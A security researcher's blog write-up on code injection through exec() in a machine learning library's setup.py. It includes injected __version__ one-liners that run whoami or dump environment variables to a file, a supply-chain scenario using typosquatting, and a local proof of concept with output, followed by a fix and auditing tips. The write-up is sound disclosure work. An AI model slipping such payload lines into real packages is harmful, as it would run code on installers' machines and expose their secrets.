---
title: "RCE via exec() in a Machine Learning Library's setup.py"
date: 2026-03-23 00:00:00 +0300
categories: [write-up, source-code-analysis]
tags: [python, rce, code-injection, supply-chain, source-code-analysis]
---

I was browsing through open source ML libraries one evening — not looking for anything specific, just reading code the way some people read Reddit before bed. Then I opened a `setup.py` and saw `exec()`. And not the "okay this is fine in context" kind of `exec()`. The kind that makes you sit up straight.

---

## The Discovery: 14 Lines of Trust Issues

The file in question: `setup.py`, lines 8–14. A helper function that reads the version string during package installation:

```python
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        g = {}
        exec(line, g)  # ← this right here
        return g['__version__']
    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
```

Let me walk you through what this does:

1. Opens `sonnet/__init__.py`
2. Reads it line by line
3. Finds the line that starts with `__version__`
4. **Executes the entire line as Python code**
5. Extracts the version from the resulting namespace

Step 4 is where things get interesting. The function doesn't parse the version string — it *runs* it. Whatever is on that line gets executed with full Python privileges. No sandbox. No validation. No questions asked.

---

## Why This Matters

Under normal circumstances, `sonnet/__init__.py` contains something like:

```python
__version__ = "2.0.3"
```

Harmless. `exec()` runs it, `g['__version__']` gets `"2.0.3"`, everyone goes home happy.

But `exec()` doesn't care about your intentions. It cares about syntax. And this is perfectly valid Python:

```python
__version__ = "2.0.3"; import subprocess; subprocess.run(["cmd", "/c", "whoami > C:/pwned.txt"])
```

One line. Starts with `__version__`. Passes the `startswith` check. Gets executed in full. The version is set *and* a system command runs. The function returns `"2.0.3"` as if nothing happened.

---

## The Attack Scenario

Here's how this becomes a real problem:

**Step 1** — Attacker forks the repository and modifies `sonnet/__init__.py`:

```python
__version__ = "2.0.3.dev"; import os; open("/tmp/stolen.txt", "w").write(os.popen("env").read())
```

**Step 2** — Attacker distributes the modified package. This could be:
- A typosquatted package on PyPI (`dm-sonet`, `dm-sonnett`)
- A compromised dependency in a requirements file
- A pull request that slips past review (it's one line change in `__init__.py`)

**Step 3** — Victim runs `pip install` and the malicious code executes during installation — before a single line of the library's actual code runs.

The beautiful (terrible?) part: `_get_sonnet_version()` faithfully returns `"2.0.3.dev"`. The install completes normally. No errors. No warnings. The payload ran 14 lines into `setup.py` and left no trace in the installation output.

---

## PoC

**Environment**

```
Python   == 3.13.1
OS       == Windows 10
```

**The vulnerable `setup.py` function, isolated:**

```python
import subprocess
import tempfile
import os
import shutil

def create_malicious_payload():
    temp_dir = tempfile.mkdtemp(prefix="sonnet_poc_")
    os.makedirs(os.path.join(temp_dir, "sonnet"), exist_ok=True)

    # The payload: sets __version__ AND writes a file to prove RCE
    payload = '__version__ = "2.0.3.dev"; import os; open("C:/PWNED.txt", "w").write("RCE SUCCESS: " + os.getlogin())'

    with open(os.path.join(temp_dir, "sonnet", "__init__.py"), "w") as f:
        f.write(payload)

    # Exact copy of the vulnerable function
    setup_code = '''
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        g = {}
        exec(line, g)  # VULNERABLE
        return g['__version__']

version = _get_sonnet_version()
print(f"Version: {version}")
'''

    with open(os.path.join(temp_dir, "setup.py"), "w") as f:
        f.write(setup_code)

    return temp_dir

if __name__ == "__main__":
    poc_dir = create_malicious_payload()
    print(f"[+] Created malicious setup in: {poc_dir}")

    subprocess.run(["python", "setup.py"], cwd=poc_dir)

    if os.path.exists("C:/PWNED.txt"):
        print("[+] RCE SUCCESSFUL - Payload executed!")
        with open("C:/PWNED.txt") as f:
            print(f"[+] Output: {f.read()}")

    shutil.rmtree(poc_dir)
```

**Output:**

```
[+] Created malicious setup in: C:\Users\...\sonnet_poc_xyz
Version: 2.0.3.dev
[+] RCE SUCCESSFUL - Payload executed!
[+] Output: RCE SUCCESS: Monster
```

The function returned the version correctly. It also ran arbitrary code. Both things happened. Neither complained about the other.

---

## The Fix

Replace `exec()` with string parsing. You don't need to *run* code to *read* a string:

```python
def _get_sonnet_version():
  with open('sonnet/__init__.py') as fp:
    for line in fp:
      if line.startswith('__version__'):
        version = line.split('=')[1].strip().strip('"\'')
        return version
    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
```

Or use `ast.literal_eval()` if you want to be fancy about it. The point is: parsing a string and executing a string are two very different operations, and only one of them can install a backdoor on your machine.

---

## Things to Watch For When Auditing Source Code

This pattern shows up more often than you'd think, especially in `setup.py` files across the Python ecosystem. Here's what to look for:

**`exec()` and `eval()` on file content.** If a build script reads a file and passes its contents to `exec()`, that file becomes an attack vector. The `setup.py` runs during installation — before you ever `import` anything — which means the attack surface exists even if you never use the library.

**The "it starts with X" assumption.** The function checks `line.startswith('__version__')` and treats everything after that as safe. This is a common pattern: validate the prefix, trust the rest. Attackers love this.

**Supply chain as attack vector.** The vulnerability isn't in the library's runtime code. It's in the build system. A `setup.py` that runs `exec()` turns every `pip install` into a potential code execution event. When you audit a project, don't skip the build files.

---

## References

- **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
- **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)

---

Python `3.13.1` | March 2026
